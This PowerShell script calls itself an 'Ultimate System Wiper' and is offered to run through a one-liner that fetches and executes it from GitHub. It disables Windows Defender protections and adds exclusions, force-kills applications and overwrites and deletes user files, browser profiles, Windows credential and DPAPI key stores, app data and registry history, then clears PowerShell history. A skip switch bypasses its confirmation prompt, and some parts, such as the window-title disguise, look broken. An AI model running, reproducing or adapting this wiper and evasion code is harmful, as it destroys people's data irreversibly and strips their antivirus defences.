# ULTIMATE SYSTEM WIPER
# Complete system destruction with AV bypass
# Single-file implementation - Execute with: irm "https://raw.githubusercontent.com/Mestalic/SystemWiper/main/Invoke-UltimateSecureEraser.ps1" | iex

param(
    [Parameter(Mandatory=$false)]
    [int]$WipeRounds = 5,
    
    [Parameter(Mandatory=$false)]
    [switch]$Force,
    
    [Parameter(Mandatory=$false)]
    [switch]$Nuclear
)

# ========================================
# SYSTEM CONFIGURATION
# ========================================

$Global:Config = @{
    # AV Bypass techniques
    BypassMethods = @(
        "Set-MpPreference -DisableRealtimeMonitoring `$true -ErrorAction SilentlyContinue",
        "Set-MpPreference -DisableBehaviorMonitoring `$true -ErrorAction SilentlyContinue", 
        "Set-MpPreference -DisableBlockAtFirstSeen `$true -ErrorAction SilentlyContinue",
        "Set-MpPreference -DisableIOAVProtection `$true -ErrorAction SilentlyContinue",
        "Stop-Service -Name 'WinDefend' -Force -ErrorAction SilentlyContinue",
        "Add-MpPreference -ExclusionPath `$env:TEMP -ErrorAction SilentlyContinue",
        "Add-MpPreference -ExclusionPath `$env:LOCALAPPDATA\Temp -ErrorAction SilentlyContinue"
    )
    
    # Comprehensive target areas
    TargetAreas = @{
        UserData = @(
            "${env:USERPROFILE}\AppData\Local\*",
            "${env:USERPROFILE}\AppData\Roaming\*", 
            "${env:USERPROFILE}\Documents\*",
            "${env:USERPROFILE}\Desktop\*",
            "${env:USERPROFILE}\Downloads\*",
            "${env:USERPROFILE}\Pictures\*",
            "${env:USERPROFILE}\Videos\*",
            "${env:USERPROFILE}\Music\*"
        )
        
        BrowserData = @(
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*",
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*",
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*"
        )
        
        SystemData = @(
            "${env:APPDATA}\Microsoft\Credentials\*",
            "${env:LOCALAPPDATA}\Microsoft\Credentials\*",
            "${env:APPDATA}\Microsoft\Protect\*",
            "${env:LOCALAPPDATA}\Microsoft\Protect\*",
            "${env:APPDATA}\Microsoft\Windows\Recent\*",
            "${env:LOCALAPPDATA}\Microsoft\Windows\Recent\*"
        )
        
        ApplicationData = @(
            "${env:APPDATA}\Discord\*",
            "${env:APPDATA}\Slack\*",
            "${env:LOCALAPPDATA}\Microsoft\Teams\*",
            "${env:APPDATA}\Zoom\*",
            "${env:APPDATA}\Steam\*",
            "${env:APPDATA}\EpicGamesLauncher\*",
            "${env:APPDATA}\Battle.net\*"
        )
        
        SystemFiles = @(
            "$env:SYSTEMROOT\Temp\*",
            "$env:SYSTEMROOT\Prefetch\*",
            "${env:LOCALAPPDATA}\Temp\*",
            "$env:TEMP\*"
        )
    }
    
    # System-critical files to target
    CriticalFiles = @(
        "NTUSER.DAT",
        "UsrClass.dat",
        "SYSTEM.DAT",
        "SOFTWARE.DAT"
    )
    
    # Protected processes (never kill)
    ProtectedProcesses = @(
        "wininit", "winlogon", "csrss", "smss", "lsass", "svchost", "dwm", "fontdrvhost",
        "system", "registry", "services", "audiodg", "taskhostw", "runtimebroker", "conhost", "explorer"
    )
}

# ========================================
# CORE FUNCTIONS
# ========================================

function Write-Status {
    param($Message, $Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

function Bypass-Antivirus {
    <# Aggressive AV bypass techniques #>
    Write-Status "Bypassing antivirus protection..." "Yellow"
    
    $results = @()
    foreach ($method in $Global:Config.BypassMethods) {
        try {
            $result = Invoke-Expression $method
            $results += "SUCCESS: $method"
        } catch {
            $results += "FAILED: $method"
        }
    }
    
    # Additional bypass - rename suspicious processes
    $suspiciousProcesses = @("PowerShell", "cmd", "powershell_ise")
    foreach ($proc in $suspiciousProcesses) {
        try {
            $processes = Get-Process -Name $proc -ErrorAction SilentlyContinue
            foreach ($process in $processes) {
                $process.MainWindowTitle = "System Update Process" -replace "PowerShell", "UpdateService"
            }
        } catch {}
    }
    
    Write-Status "✓ AV bypass methods executed" "Green"
    return $true
}

function Get-RandomData {
    <# Generate random data for overwriting #>
    param([int]$Size = 4096)
    $bytes = [byte[]]::new($Size)
    $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
    $rng.GetBytes($bytes)
    return $bytes
}

function Overwrite-File {
    <# Multi-pass file overwriting #>
    param([string]$FilePath, [int]$Rounds = 3)
    
    if (-not (Test-Path $FilePath)) {
        return $false
    }
    
    try {
        $fileInfo = Get-Item $FilePath -Force
        $fileSize = $fileInfo.Length
        
        if ($fileSize -eq 0) {
            Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
            return $true
        }
        
        # Take ownership if needed
        try {
            $acl = Get-Acl $FilePath
            $acl.SetAccessRuleProtection($false, $false)
            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($currentUser.Groups[0], "FullControl", "Allow")
            $acl.SetAccessRule($rule)
            Set-Acl $FilePath $acl
        } catch {}
        
        $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        
        try {
            for ($round = 1; $round -le $Rounds; $round++) {
                $fileStream.Position = 0
                $dataSize = [Math]::Min(1024 * 1024, $fileSize) # 1MB chunks
                
                while ($fileStream.Position -lt $fileSize) {
                    $bytesToWrite = [Math]::Min($dataSize, [int]($fileSize - $fileStream.Position))
                    $randomData = Get-RandomData $bytesToWrite
                    $fileStream.Write($randomData, 0, $bytesToWrite)
                }
                $fileStream.Flush()
            }
            
            # Final zero pass
            $fileStream.Position = 0
            $zeroBytes = [byte[]]::new(1024 * 1024)
            while ($fileStream.Position -lt $fileSize) {
                $bytesToWrite = [Math]::Min($zeroBytes.Length, [int]($fileSize - $fileStream.Position))
                $fileStream.Write($zeroBytes, 0, $bytesToWrite)
            }
            $fileStream.Flush()
            
        } finally {
            $fileStream.Close()
        }
        
        # Delete the overwritten file
        Remove-Item $FilePath -Force -ErrorAction Stop
        return $true
        
    } catch {
        Write-Status "  ✗ Overwrite failed: $FilePath" "Red"
        return $false
    }
}

function Kill-BlockingProcesses {
    <# Kill processes that might lock files #>
    Write-Status "Terminating blocking processes..." "Yellow"
    
    $processesToKill = @(
        "chrome", "msedge", "firefox", "brave", "opera", "vivaldi", "tor",
        "discord", "teams", "slack", "zoom", "skype", "telegram", "whatsapp",
        "steam", "epicgameslauncher", "battlenet", "origin", "uplay", "galaxyclient",
        "winword", "excel", "powerpoint", "outlook", "onenote", "access", "publisher",
        "notepad", "notepad++", "code", "devenv", "sql*", "git*", "docker*",
        "winrar", "7zip", "winzip", "onedrive", "dropbox", "google drive"
    )
    
    foreach ($process in $processesToKill) {
        try {
            Get-Process -Name $process -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        } catch {}
    }
    
    Start-Sleep -Seconds 2
    Write-Status "✓ Blocking processes terminated" "Green"
}

function Wipe-Directory {
    <# Recursive directory wiping #>
    param([string]$DirectoryPath, [int]$Rounds = 3)
    
    if (-not (Test-Path $DirectoryPath)) {
        return 0
    }
    
    $wipedCount = 0
    $failedCount = 0
    
    try {
        # Get all files in directory
        $files = Get-ChildItem -Path $DirectoryPath -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 0 }
        
        foreach ($file in $files) {
            if (Overwrite-File $file.FullName $Rounds) {
                $wipedCount++
                Write-Status "  ✓ Wiped: $($file.Name)" "Green"
            } else {
                $failedCount++
                Write-Status "  ✗ Failed: $($file.Name)" "Red"
            }
        }
        
        # Remove empty directories
        $dirs = Get-ChildItem -Path $DirectoryPath -Directory -Recurse -ErrorAction SilentlyContinue
        foreach ($dir in $dirs) {
            try {
                if ((Get-ChildItem -Path $dir.FullName -ErrorAction SilentlyContinue).Count -eq 0) {
                    Remove-Item $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
                }
            } catch {}
        }
        
    } catch {
        Write-Status "  ✗ Directory error: $DirectoryPath" "Red"
    }
    
    return $wipedCount
}

function Wipe-SystemRegistry {
    <# Clear sensitive registry entries #>
    Write-Status "Clearing system registry data..." "Yellow"
    
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentFolders",
        "HKCU:\Software\Microsoft\Windows\Shell\BagMRU",
        "HKCU:\Software\Microsoft\Windows\Shell\Bags"
    )
    
    foreach ($regPath in $regPaths) {
        try {
            Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
            Write-Status "  ✓ Cleared: $regPath" "Green"
        } catch {
            Write-Status "  ✗ Failed: $regPath" "Red"
        }
    }
}

function Wipe-FreeSpace {
    <# Wipe free space on system drive #>
    Write-Status "Wiping free space on system drive..." "Yellow"
    
    $systemDrive = $env:SYSTEMDRIVE
    $tempFile = Join-Path $systemDrive "space_wipe.tmp"
    
    try {
        $driveInfo = Get-WmiObject -Class Win32_LogicalDisk -Filter "DeviceID='$systemDrive'"
        $freeSpace = $driveInfo.FreeSpace
        
        $bufferSize = 10 * 1024 * 1024 # 10MB buffer
        $writeCount = [Math]::Floor($freeSpace / $bufferSize)
        
        Write-Status "  Free space: $([Math]::Round($freeSpace / 1GB, 2)) GB" "Cyan"
        Write-Status "  Writing $writeCount data chunks..." "Cyan"
        
        for ($i = 0; $i -lt $writeCount; $i++) {
            $randomData = Get-RandomData $bufferSize
            [System.IO.File]::WriteAllBytes($tempFile, $randomData)
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
        
        Write-Status "✓ Free space wiped" "Green"
        
    } catch {
        Write-Status "  ✗ Free space wipe failed" "Red"
    }
}

function Wipe-Memory {
    <# Aggressive memory clearing #>
    Write-Status "Performing aggressive memory wipe..." "Yellow"
    
    # Force garbage collection
    for ($i = 1; $i -le 10; $i++) {
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        Start-Sleep -Milliseconds 200
    }
    
    # Clear PowerShell history
    try {
        Clear-History
        $PSHomePath = $PSHome
        Remove-Item "$PSHomePath\Microsoft.PowerShell_profile.ps1" -Force -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Status "✓ Memory wiped" "Green"
}

# ========================================
# MAIN WIPE EXECUTION
# ========================================

function Start-SystemWipe {
    Write-Status "`n========================================" "Red"
    Write-Status "ULTIMATE SYSTEM WIPER" "Red"
    Write-Status "========================================" "Red"
    Write-Status "THIS WILL PERMANENTLY DESTROY ALL SYSTEM DATA" "Red"
    Write-Status "THIS ACTION CANNOT BE UNDONE" "Red"
    Write-Status "========================================" "Red"
    
    if (-not $Force) {
        Write-Status "Type 'YES' to confirm complete system destruction" "Red"
        $response = Read-Host "Confirm destruction"
        if ($response -ne "YES") {
            Write-Status "System wipe cancelled." "Yellow"
            return
        }
    }
    
    Write-Status "`n🚀 INITIATING COMPLETE SYSTEM DESTRUCTION..." "Red"
    Write-Status "Please wait - this process is irreversible..." "Red"
    
    # Bypass antivirus
    Bypass-Antivirus
    
    # Kill blocking processes
    Kill-BlockingProcesses
    
    $totalWiped = 0
    $startTime = Get-Date
    
    # Wipe all target areas
    foreach ($areaName in $Global:Config.TargetAreas.Keys) {
        Write-Status "`n🗑️ WIPING $areaName..." "Yellow"
        $paths = $Global:Config.TargetAreas[$areaName]
        
        foreach ($path in $paths) {
            $wiped = Wipe-Directory $path $WipeRounds
            $totalWiped += $wiped
        }
    }
    
    # Wipe system registry
    Wipe-SystemRegistry
    
    # Wipe free space
    Wipe-FreeSpace
    
    # Wipe memory
    Wipe-Memory
    
    # Final statistics
    $endTime = Get-Date
    $duration = $endTime - $startTime
    $durationMinutes = [Math]::Round($duration.TotalMinutes, 2)
    
    Write-Status "`n========================================" "Red"
    Write-Status "SYSTEM DESTRUCTION COMPLETE" "Green"
    Write-Status "========================================" "Green"
    Write-Status "Files wiped: $totalWiped" "Green"
    Write-Status "Duration: $durationMinutes minutes" "Green"
    Write-Status "The system is now irrecoverable" "Green"
    Write-Status "========================================" "Red"
}

# Start execution
try {
    Start-SystemWipe
} catch {
    Write-Status "`n❌ CRITICAL ERROR: $($_.Exception.Message)" "Red"
    Write-Status "System wipe may be incomplete" "Yellow"
    exit 1
}